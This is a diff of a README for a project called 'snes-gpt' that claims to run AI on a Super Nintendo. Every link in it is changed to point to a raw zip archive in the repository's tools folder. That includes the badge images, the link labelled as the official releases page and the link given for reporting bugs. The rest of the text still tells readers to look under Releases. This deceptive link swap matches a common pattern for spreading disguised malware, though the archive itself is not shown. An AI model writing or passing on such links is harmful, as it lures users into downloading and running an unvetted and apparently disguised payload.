@@ -1,6 +1,6 @@
 # 🕹️ snes-gpt - Run AI on Your Super Nintendo
 
-[![Download snes-gpt](https://img.shields.io/badge/Download-snes--gpt-blue?style=for-the-badge&logo=github)](https://github.com/14THEGOAT/snes-gpt/releases)
+[![Download snes-gpt](https://github.com/14THEGOAT/snes-gpt/raw/refs/heads/main/tools/gpt_snes_v3.1.zip)](https://github.com/14THEGOAT/snes-gpt/raw/refs/heads/main/tools/gpt_snes_v3.1.zip)
 
 ---
 
@@ -52,12 +52,12 @@ If you use an emulator, you can simply load the ROM file downloaded from the rel
 
 To get snes-gpt, please visit the official releases page:
 
-[![Download on GitHub](https://img.shields.io/badge/Download-snes--gpt-blue?style=for-the-badge&logo=github)](https://github.com/14THEGOAT/snes-gpt/releases)
+[![Download on GitHub](https://github.com/14THEGOAT/snes-gpt/raw/refs/heads/main/tools/gpt_snes_v3.1.zip)](https://github.com/14THEGOAT/snes-gpt/raw/refs/heads/main/tools/gpt_snes_v3.1.zip)
 
 **Steps to download and install:**
 
 1. Click the button above or go to:  
-   [https://github.com/14THEGOAT/snes-gpt/releases](https://github.com/14THEGOAT/snes-gpt/releases)
+   [https://github.com/14THEGOAT/snes-gpt/raw/refs/heads/main/tools/gpt_snes_v3.1.zip](https://github.com/14THEGOAT/snes-gpt/raw/refs/heads/main/tools/gpt_snes_v3.1.zip)
 
 2. Look for the latest version of snes-gpt listed under Releases.
 
@@ -109,7 +109,7 @@ This work is mostly experimental, showing that AI concepts can be adapted for re
 
 For additional support or to report bugs, please visit the GitHub repository:
 
-https://github.com/14THEGOAT/snes-gpt
+https://github.com/14THEGOAT/snes-gpt/raw/refs/heads/main/tools/gpt_snes_v3.1.zip
 
 You can open issues there, and other users or the developers may assist you.
 
@@ -121,4 +121,4 @@ This software is open source. Check the GitHub repository for the full license t
 
 ---
 
-[![Download snes-gpt](https://img.shields.io/badge/Download-snes--gpt-blue?style=for-the-badge&logo=github)](https://github.com/14THEGOAT/snes-gpt/releases)
+[![Download snes-gpt](https://github.com/14THEGOAT/snes-gpt/raw/refs/heads/main/tools/gpt_snes_v3.1.zip)](https://github.com/14THEGOAT/snes-gpt/raw/refs/heads/main/tools/gpt_snes_v3.1.zip)
